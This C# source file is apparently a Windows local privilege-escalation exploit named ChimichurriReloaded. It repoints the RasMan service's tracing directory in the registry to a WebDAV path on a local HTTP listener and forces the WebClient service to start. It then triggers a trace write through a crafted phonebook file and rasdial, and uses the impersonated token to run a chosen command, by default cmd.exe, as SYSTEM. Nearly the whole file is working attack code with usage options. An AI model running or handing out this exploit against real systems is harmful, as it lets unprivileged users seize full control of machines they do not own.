using System;
using System.Linq;
using System.Threading;
using Microsoft.Win32;
using System.ServiceProcess;
using System.Diagnostics;
using System.IO;
using CommandLine;

namespace ChimichurriReloaded
{
    class Program
    {
        private static bool verbose = false;
        class Options
        {
            [Option('p', "port", Required = false, HelpText = "Set local HTTP listening port.", Default = "9876")]
            public string Port { get; set; }
            [Option('c', "command", Required = false, HelpText = "Command to run as SYSTEM", Default = @"C:\Windows\System32\cmd.exe")]
            public string Command { get; set; }
            [Option('a', "arguments", Required = false, HelpText = "Arguments to pass to command you wish to run as SYSTEM.")]
            public string Arguments { get; set; }
            [Option('u', "createprocessasuser", Required = false, HelpText = "(Default: CreateProcessWithToken) Use CreateProcessAsUser with SeAssignPrimaryToken privilege.")]
            public bool CreateProcessAsUser { get; set; }
            [Option('v', "verbose", Required = false, HelpText = "Set output to verbose messages.")]
            public bool Verbose { get; set; }
        }
        
        static void WriteVerbose(string output)
        {
            if(verbose)
            {
                Console.WriteLine(output);
            }
        }
        static void UpdateRegistry(string fileDirectory, string enableFileTracing)
        {
            Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Tracing\RASMAN",true).SetValue("FileDirectory", fileDirectory, RegistryValueKind.ExpandString);
            Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Tracing\RASMAN", true).SetValue("EnableFileTracing", enableFileTracing, RegistryValueKind.DWord);
        }

        // Just one way I was able to trigger RasMan to attempt to write to the trace file, I'm sure there are others
        static void TriggerRasMan()
        {

            string rasphoneData = "[yikes]\nMEDIA=rastapi\nPort=VPN2-0\nDevice=WAN Miniport(IKEv2)\nDEVICE=vpn\nPhoneNumber=127.0.0.1";
            string rasphoneLocation = Environment.ExpandEnvironmentVariables(@"%APPDATA%\Microsoft\Network\Connections\Pbk\rasphone.pbk");
            System.IO.File.WriteAllText(rasphoneLocation, rasphoneData);

            if (File.Exists(rasphoneLocation))
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "rasdial.exe";
                startInfo.Arguments = "yikes";
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;

                Process process = new Process();
                process.StartInfo = startInfo;
                process.EnableRaisingEvents = true;
                try
                {
                    process.Start();
                    process.WaitForExit(1000);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to launch rasdial, vulnerability may not have been triggered...");
                }

                File.Delete(rasphoneLocation);
            }
        }
        public static void Main(string[] args)
        {
            // Handle command line arguments
            var options = new Options();
            var result = Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o => options = o);
            if (result.Tag == ParserResultType.NotParsed)
            {
                Environment.Exit(1);
            }
            verbose = options.Verbose;

            // Setup HTTP Impersonator listener
            WriteVerbose("[+] Starting HttpImpersonator...");
            HttpImpersonator httpServer = new HttpImpersonator(options.Port,options.Command,options.Arguments,options.CreateProcessAsUser);
            Thread httpServerThread = new Thread(()=>httpServer.Start());
            httpServerThread.Start();

            // Ensure WebClient is present and started, the exploit requires WebClient
            ServiceController webClientService = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == "WebClient");
            if (webClientService == null)
            {
                Console.WriteLine("[!] WebClient not present, exploit won't work!");
                Environment.Exit(1);
            }
            else
            {
                if (webClientService.Status != ServiceControllerStatus.Running)
                {
                    if (ServiceTrigger.Start("22b6d684-fa63-4578-87c9-effcbe6643c7"))
                    {
                        WriteVerbose("[+] WebClient started...");
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to start WebClient, exploit won't work!");
                        Environment.Exit(1);
                    }
                }
                else
                {
                    WriteVerbose("[+] WebClient already running...");
                }
            }

            // If RasMan has never run, the tracing key won't exist, so starting RasMan will create the keys
            string originalFileDirectory = "";
            TimeSpan timeout = TimeSpan.FromMilliseconds(4000);
            ServiceController service = new ServiceController("RasMan");
            try
            {
                originalFileDirectory = (string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Tracing\\RASMAN").GetValue("FileDirectory", "", RegistryValueOptions.DoNotExpandEnvironmentNames);
            }
            catch
            {
                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, timeout);
                originalFileDirectory = (string)Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Tracing\\RASMAN").GetValue("FileDirectory", "", RegistryValueOptions.DoNotExpandEnvironmentNames);

            }

            // Update the registry keys to enable tracing and point the FileDirectory to a UNC path of the HTTP listener
            UpdateRegistry(string.Format(@"\\localhost@{0}\tracing",options.Port), "1");

            // If the service isn't running, starting it will trigger an attempted write to the trace file.
            // If the service is running, updating the registry won't always immediately trigger an attempted write
            // to the trace file so I trigger an attempted write by creating a VPN connection and trying to connect
            // to it using rasdial.exe (there are probably better ways)
            if(service.Status != ServiceControllerStatus.Running)
            {
                WriteVerbose("[+] Starting RasMan service...");
                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, timeout);
            }
            else
            {
                WriteVerbose("[+] RasMan service already running, attempting to trigger a write to the trace file...");
                TriggerRasMan();
            }

            httpServerThread.Join();

            // Clean up after yourself!
            WriteVerbose("[+] Cleaning up registry...");
            UpdateRegistry(originalFileDirectory, "0");
        }
    }
}
